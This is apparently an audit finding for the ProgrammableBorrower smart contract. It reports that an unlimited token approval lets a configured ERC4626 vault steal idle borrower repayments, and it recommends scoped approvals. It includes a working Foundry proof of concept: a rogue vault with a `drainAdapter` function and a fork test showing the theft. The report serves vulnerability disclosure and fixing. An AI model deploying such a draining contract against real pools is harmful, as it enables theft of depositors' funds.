### Title
Configured ERC4626 vault receives unlimited allowance and can steal repaid pool funds - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` grants its configured ERC4626 `vault` unlimited underlying-token allowance during initialization and again whenever the vault is changed. A malicious or compromised configured vault can therefore pull underlying from the borrower adapter even when no deposit is being executed, including borrower repayments left idle between epochs.

### Finding Description
`initialize` stores the operator-selected ERC4626 vault and calls `_allowUnlimitedSpend` for both that vault and `idleCDO`. [1](#0-0)  `setVault` repeats the same pattern for a replacement vault after clearing only the previous vault’s approval. [2](#0-1)  `_allowUnlimitedSpend` grants `type(uint256).max`, not merely the amount required for the next `deposit`. [3](#0-2) 

This is analogous to forwarding a reusable session credential to a configured endpoint: once configured, the vault receives a persistent bearer authorization rather than a one-operation authorization. The resulting exposure is not limited to assets intentionally supplied through `vault.deposit`.

A concrete vulnerable path exists during the programmable borrower’s buffer phase. `_repay` pulls `borrowerPrincipal`, `borrowerInterestDebt`, and `borrowerInterestAccrued` from the honest configured borrower into `ProgrammableBorrower`. [4](#0-3)  It redeposits repayment proceeds only while `epochAccountingActive` is true; when epoch accounting is inactive, the underlying remains on `ProgrammableBorrower`, with only current-epoch interest recorded in `bufferInterest`. [5](#0-4)  At that point, the configured vault can independently call `underlyingToken.transferFrom(address(programmableBorrower), attacker, amount)` using the standing approval.

The stolen repayment is not an already-deposited vault asset: the vault obtains it solely because the adapter granted an unlimited allowance. The next `onStartEpoch` calculates the asset baseline from on-hand underlying plus vault assets and deposits only the remaining on-hand balance, so the missing repayment permanently reduces the facility’s accounted assets. [6](#0-5) 

### Impact Explanation
An attacker-controlled or compromised configured ERC4626 vault can steal all underlying held by `ProgrammableBorrower` outside the vault. In the buffer-phase path above, that includes the borrower’s principal and interest repayment before it is redeployed.

The direct loss is at least `underlyingToken.balanceOf(address(programmableBorrower))` at the time of `transferFrom`. For example, with a 10,000 USDC facility, a 4,000 USDC borrower draw, and a post-stop repayment of 4,000 USDC plus accrued interest, the configured vault can take the entire repaid amount while retaining only the roughly 6,000 USDC vault position. The pool consequently loses the repayment amount and becomes undercollateralized or defaults when the shortfall is later discovered.

This affects production programmable-borrower accounting and is not merely a consequence of depositing into a bad vault. Even a vault that behaves normally for `deposit`, `withdraw`, `redeem`, and valuation can selectively abuse the excess allowance only when borrower repayments create idle adapter liquidity.

### Likelihood Explanation
The attack requires the configured vault itself to be malicious or compromised. That is still a meaningful trust-boundary failure because the contract only needs approval for ERC4626 deposits, yet grants indefinite authority over all current and future adapter balances. Vault upgrades, compromised vault governance, malicious implementation code, or an operator mistakenly selecting a malicious vault can turn the stored approval into an immediate theft capability.

Honest owner and manager actions are limited to ordinary configuration and epoch sequencing. The attacker is the configured external contract, not a privileged protocol role. No borrower misbehavior is required: the borrower simply repays using the intended `repay(0)` flow.

### Recommendation
Do not retain unlimited vault allowance. Approve only the amount immediately required by each deposit and clear it after the call, or use `safeIncreaseAllowance`/`safeDecreaseAllowance` around the deposit while reverting if a nonzero residual allowance remains. Ensure `setVault` clears the outgoing vault’s allowance and does not grant replacement approval until an actual deposit is made. IdleCDO’s standing allowance should likewise be reduced to the settlement flow or tightly scoped if it is not required to remain unlimited.

### Proof of Concept
This PoC extends the existing mainnet-fork test setup in `test/foundry/ProgrammableBorrowerCreditVault.t.sol`. The vault implements the ERC4626 calls used by `ProgrammableBorrower` but adds `drainAdapter`, which uses only the standing underlying-token allowance.

```solidity
contract ApprovalDrainingERC4626 is ERC20 {
    IERC20Detailed public immutable assetToken;

    constructor(address asset_) ERC20("Configured Vault", "CVLT") {
        assetToken = IERC20Detailed(asset_);
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function convertToAssets(uint256 shares) external view returns (uint256) {
        uint256 supply = totalSupply();
        if (supply == 0) return shares;
        return shares * assetToken.balanceOf(address(this)) / supply;
    }

    function deposit(uint256 assets, address receiver)
        external
        returns (uint256 shares)
    {
        uint256 beforeBal = assetToken.balanceOf(address(this));
        uint256 supply = totalSupply();
        shares = supply == 0 || beforeBal == 0
            ? assets
            : assets * supply / beforeBal;
        assetToken.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function withdraw(uint256 assets, address receiver, address owner)
        external
        returns (uint256 shares)
    {
        shares = _toSharesRoundUp(assets);
        if (msg.sender != owner) _spendAllowance(owner, msg.sender, shares);
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }

    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        assets = convertToAssets(shares);
        if (msg.sender != owner) _spendAllowance(owner, msg.sender, shares);
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }

    function drainAdapter(address adapter, address attacker) external {
        assetToken.transferFrom(
            adapter,
            attacker,
            assetToken.balanceOf(adapter)
        );
    }

    function _toSharesRoundUp(uint256 assets)
        internal
        view
        returns (uint256 shares)
    {
        uint256 supply = totalSupply();
        uint256 managed = assetToken.balanceOf(address(this));
        if (supply == 0 || managed == 0) return assets;
        shares = assets * supply / managed;
        if (shares * managed < assets * supply) shares += 1;
    }
}
```

Add the following test inside `TestProgrammableBorrowerCreditVault`:

```solidity
function testConfiguredVaultCanDrainBufferRepaymentWithStoredAllowance()
    external
{
    ApprovalDrainingERC4626 rogueVault =
        new ApprovalDrainingERC4626(USDC);
    address attacker = makeAddr("vaultOperator");

    // Rebuild the fork with the rogue ERC4626 as the honestly configured vault.
    _setUpProgrammableBorrowerCreditVault(
        FORK_BLOCK,
        address(rogueVault)
    );

    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);

    uint256 depositAmount = 10_000 * oneScale;
    uint256 drawAmount = 4_000 * oneScale;

    idleCDO.depositAA(depositAmount);
    _startEpochAndCheckPrices(0);

    vm.prank(revolvingBorrower);
    programmableBorrower.borrow(drawAmount);

    vm.warp(cdoEpoch.epochEndDate() + 1);

    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    // Honest borrower repays during the stopped/buffer phase. Because
    // epochAccountingActive is false, ProgrammableBorrower retains this cash.
    uint256 repayment =
        programmableBorrower.borrowerPrincipal() +
        programmableBorrower.borrowerInterestOwedNow();
    assertGt(repayment, 0);

    deal(USDC, revolvingBorrower, repayment, true);
    vm.prank(revolvingBorrower);
    programmableBorrower.repay(0);

    assertEq(underlying.balanceOf(address(programmableBorrower)), repayment);
    assertEq(
        underlying.allowance(
            address(programmableBorrower),
            address(rogueVault)
        ),
        type(uint256).max
    );

    rogueVault.drainAdapter(address(programmableBorrower), attacker);

    assertEq(underlying.balanceOf(attacker), repayment);
    assertEq(underlying.balanceOf(address(programmableBorrower)), 0);
}
```

The assertion on `underlying.balanceOf(attacker)` demonstrates direct theft of funds that were not supplied through a vault deposit. Removing the standing approval or reducing it to the deposit amount prevents `drainAdapter` from succeeding.

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L125-134)
```text
    underlyingToken = IERC20Detailed(_underlyingToken);
    vault = IERC4626(_vault);
    idleCDO = _idleCDO;
    manager = _manager;
    borrower = _borrower;
    borrowerApr = _borrowerApr;

    // Set approvals for vault and IdleCDO
    _allowUnlimitedSpend(_underlyingToken, _vault);
    _allowUnlimitedSpend(_underlyingToken, _idleCDO);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L153-169)
```text
  /// @notice Set the vault used to deploy idle funds.
  /// @dev Owner or manager. This does not migrate an existing position. The operator must first
  /// withdraw from the old vault and wait until epoch accounting is inactive, otherwise assets can
  /// remain stranded there and the live accounting views will stop including them after the switch.
  /// @param _vault new ERC4626 vault address
  function setVault(address _vault) external {
    _checkOnlyOwnerOrManager();
    if (_vault == address(0) || IERC4626(_vault).asset() != address(underlyingToken)) {
      revert InvalidAddress();
    }
    // Switching the accounting source is only safe once the current epoch is fully settled and the
    // old vault position has been unwound.
    if (epochAccountingActive || vault.balanceOf(address(this)) != 0) revert NotAllowed();
    underlyingToken.safeApprove(address(vault), 0);
    vault = IERC4626(_vault);
    _allowUnlimitedSpend(address(underlyingToken), _vault);
    emit VaultUpdated(_vault);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L212-223)
```text
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
    emit EpochAccountingStarted(startAssets);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L465-482)
```text
  /// @notice Shared repay implementation for direct borrower calls and authorized executors.
  function _repay(uint256 assets) internal returns (uint256 interestPaid, uint256 principalPaid) {
    _accrueBorrowerInterest();
    // `_accrueBorrowerInterest` checkpoints the live pending leg into `borrowerInterestAccrued`,
    // so the capped amount can be computed directly from the stored debt buckets.
    uint256 totalOwed = borrowerPrincipal + borrowerInterestDebt + borrowerInterestAccrued;

    if (assets == 0) {
      if (totalOwed == 0) revert InvalidAmount();
      assets = totalOwed;
    } else {
      if (totalOwed == 0) revert InvalidAmount();
      if (assets > totalOwed) {
        assets = totalOwed;
      }
    }

    underlyingToken.safeTransferFrom(borrower, address(this), assets);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L523-532)
```text
    emit Repaid(interestPaid + principalPaid, interestPaid, principalPaid);
    if (epochAccountingActive) {
      // Current-epoch borrower interest must remain visible as profit at stopEpoch, while principal,
      // previously-fronted debt, and any excess repayment should only extend the epoch principal baseline.
      _depositToVault(totalRepaidAssets, totalRepaidAssets - currentEpochInterestPaid);
    } else if (currentEpochInterestPaid != 0) {
      // Buffer-period borrower interest was paid, so it is no longer debt, but it still belongs in
      // the next pool-facing stop result instead of the next epoch's principal baseline.
      bufferInterest += currentEpochInterestPaid;
    }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L607-613)
```text
  /// @dev Set allowance for `_token` to unlimited for `_spender`.
  /// Both the vault and IdleCDO are trusted integrations, so the contract keeps a standing approval.
  /// @param _token token address
  /// @param _spender spender address
  function _allowUnlimitedSpend(address _token, address _spender) internal {
    IERC20Detailed(_token).safeIncreaseAllowance(_spender, type(uint256).max);
  }
```
